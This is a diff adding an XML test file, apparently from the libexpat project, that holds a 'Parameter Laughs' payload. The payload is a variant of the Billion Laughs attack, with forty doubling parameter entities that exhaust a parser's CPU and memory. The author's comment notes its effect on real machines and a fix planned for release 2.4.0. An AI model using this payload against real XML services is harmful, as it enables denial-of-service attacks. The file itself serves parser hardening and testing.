@@ -1,0 +1,63 @@
+<?xml version="1.0"?>
+<!--
+  Copyright (C) 2020 Sebastian Pipping <sebastian@pipping.org>
+  v3.1 2020-06-21, not (yet) to be published
+
+  "Parameter Laughs", i.e. variant of Billion Laughs Attack
+                           using parameter entities the other way around
+
+  Use of "%pe24;" below makes the XML processor (e.g. "xmlwf -p < file.xml" or
+  "xmllint file.xml > /dev/null") take 3 to 12 seconds on my machine.
+  Increase to "%pe25;" and beyond carefully: use of "%pe40;" makes my machine
+  need a hard reset.
+
+  Note that unlike libxml2, libexpat does not have any protection against
+  billion laughs attacks to this day, so it's not a new vulnerability
+  with regard to libexpat.  Upcoming release libexpat 2.4.0 will have
+  protection against this family of attacks.
+-->
+<!DOCTYPE r [
+  <!ENTITY % pe_1 "<!---->">
+  <!ENTITY % pe_2 "&#37;pe_1;<!---->&#37;pe_1;">
+  <!ENTITY % pe_3 "&#37;pe_2;<!---->&#37;pe_2;">
+  <!ENTITY % pe_4 "&#37;pe_3;<!---->&#37;pe_3;">
+  <!ENTITY % pe_5 "&#37;pe_4;<!---->&#37;pe_4;">
+  <!ENTITY % pe_6 "&#37;pe_5;<!---->&#37;pe_5;">
+  <!ENTITY % pe_7 "&#37;pe_6;<!---->&#37;pe_6;">
+  <!ENTITY % pe_8 "&#37;pe_7;<!---->&#37;pe_7;">
+  <!ENTITY % pe_9 "&#37;pe_8;<!---->&#37;pe_8;">
+  <!ENTITY % pe10 "&#37;pe_9;<!---->&#37;pe_9;">
+  <!ENTITY % pe11 "&#37;pe10;<!---->&#37;pe10;">
+  <!ENTITY % pe12 "&#37;pe11;<!---->&#37;pe11;">
+  <!ENTITY % pe13 "&#37;pe12;<!---->&#37;pe12;">
+  <!ENTITY % pe14 "&#37;pe13;<!---->&#37;pe13;">
+  <!ENTITY % pe15 "&#37;pe14;<!---->&#37;pe14;">
+  <!ENTITY % pe16 "&#37;pe15;<!---->&#37;pe15;">
+  <!ENTITY % pe17 "&#37;pe16;<!---->&#37;pe16;">
+  <!ENTITY % pe17 "&#37;pe16;<!---->&#37;pe16;">
+  <!ENTITY % pe18 "&#37;pe17;<!---->&#37;pe17;">
+  <!ENTITY % pe19 "&#37;pe18;<!---->&#37;pe18;">
+  <!ENTITY % pe20 "&#37;pe19;<!---->&#37;pe19;">
+  <!ENTITY % pe21 "&#37;pe20;<!---->&#37;pe20;">
+  <!ENTITY % pe22 "&#37;pe21;<!---->&#37;pe21;">
+  <!ENTITY % pe23 "&#37;pe22;<!---->&#37;pe22;">
+  <!ENTITY % pe24 "&#37;pe23;<!---->&#37;pe23;">
+  <!ENTITY % pe25 "&#37;pe24;<!---->&#37;pe24;">
+  <!ENTITY % pe26 "&#37;pe25;<!---->&#37;pe25;">
+  <!ENTITY % pe27 "&#37;pe26;<!---->&#37;pe26;">
+  <!ENTITY % pe28 "&#37;pe27;<!---->&#37;pe27;">
+  <!ENTITY % pe29 "&#37;pe28;<!---->&#37;pe28;">
+  <!ENTITY % pe30 "&#37;pe29;<!---->&#37;pe29;">
+  <!ENTITY % pe31 "&#37;pe30;<!---->&#37;pe30;">
+  <!ENTITY % pe32 "&#37;pe31;<!---->&#37;pe31;">
+  <!ENTITY % pe33 "&#37;pe32;<!---->&#37;pe32;">
+  <!ENTITY % pe34 "&#37;pe33;<!---->&#37;pe33;">
+  <!ENTITY % pe35 "&#37;pe34;<!---->&#37;pe34;">
+  <!ENTITY % pe36 "&#37;pe35;<!---->&#37;pe35;">
+  <!ENTITY % pe37 "&#37;pe36;<!---->&#37;pe36;">
+  <!ENTITY % pe38 "&#37;pe37;<!---->&#37;pe37;">
+  <!ENTITY % pe39 "&#37;pe38;<!---->&#37;pe38;">
+  <!ENTITY % pe40 "&#37;pe39;<!---->&#37;pe39;">
+  %pe24; <!-- not at full potential, increase towards "%pe40;" carefully -->
+]>
+<r/>
